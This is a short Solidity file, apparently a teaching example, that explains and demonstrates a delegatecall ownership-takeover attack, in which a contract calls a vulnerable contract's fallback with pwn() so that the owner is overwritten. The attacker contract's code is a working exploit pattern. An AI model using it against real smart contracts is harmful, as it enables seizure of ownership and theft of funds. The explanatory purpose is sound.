// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
    What happened?
    Eve called Attack.attack().
    Attack called the fallback function of HackMe sending the function
    selector of pwn(). HackMe forwards the call to Lib using delegatecall.
    Here msg.data contains the function selector of pwn().
    This tells Solidity to call the function pwn() inside Lib.
    The function pwn() updates the owner to msg.sender.
    Delegatecall runs the code of Lib using the context of HackMe.
    Therefore HackMe's storage was updated to msg.sender where msg.sender is the
    caller of HackMe, in this case Attack.
*/

contract MaliciousContract {
    address public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = _vulnerableContract;
    }

    function attack() public {
        vulnerableContract.call(abi.encodeWithSignature("pwn()"));
    }
}
